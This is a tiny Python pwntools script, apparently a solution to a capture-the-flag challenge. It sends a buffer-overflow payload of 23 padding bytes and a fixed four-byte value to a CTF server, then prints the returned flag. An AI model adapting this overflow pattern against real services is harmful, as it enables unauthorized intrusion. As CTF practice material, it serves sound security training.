from pwn import *

#context.log_level = 'debug'
r = remote('pwn.ctf.tamu.edu',4321)

payload = ''
payload += 'a' * 23
payload += '\x11\xba\x07\xf0'

r.sendline(payload)
print r.recvuntil('}')
